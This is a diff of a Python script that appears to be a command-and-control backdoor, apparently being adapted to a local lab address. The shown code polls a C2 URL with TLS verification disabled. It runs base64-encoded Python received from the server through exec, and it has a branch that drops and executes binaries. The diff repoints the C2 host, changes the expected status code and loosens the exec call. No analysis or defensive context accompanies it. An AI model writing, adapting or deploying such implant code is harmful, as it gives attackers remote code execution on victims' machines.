@@ -12,7 +12,7 @@ from urllib3.exceptions import InsecureRequestWarning
 requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
 
 # C2 endpoint
-url = "http://10.0.0.47/c2"
+url = "http://172.17.0.1:1337/c2"
 
 # Setup working directory
 home_directory = os.path.expanduser("~")
@@ -36,7 +36,7 @@ params = {
 while True:
     try:
         response = requests.post(url, verify=False, data=params, timeout=180)
-        if response.status_code != 200:
+        if response.status_code != 201: # 200
             time.sleep(10)
             continue
 
@@ -62,7 +62,8 @@ while True:
         elif res["ret"] == 2:
             # Execute base64-encoded Python code
             src_data = base64.b64decode(res["content"])
-            exec(src_data, {"__name__": "__main__"})
+            #exec(src_data, {"__name__": "__main__"})
+            exec(src_data)
 
         elif res["ret"] == 3:
             # Drop and execute paired binaries
@@ -90,6 +91,7 @@ while True:
 
         elif res["ret"] == 9:
             break
+        time.sleep(5)
 
     except Exception:
         time.sleep(10)
